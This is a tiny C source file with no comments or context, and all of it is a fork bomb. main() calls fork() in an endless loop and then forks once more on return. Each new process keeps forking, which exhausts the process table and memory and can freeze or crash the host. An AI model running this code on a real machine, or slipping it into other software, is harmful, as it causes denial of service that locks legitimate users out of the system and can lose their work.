#include <unistd.h>
 
 int main(void)
 {
         while(fork())
                 fork();
	return fork();
 }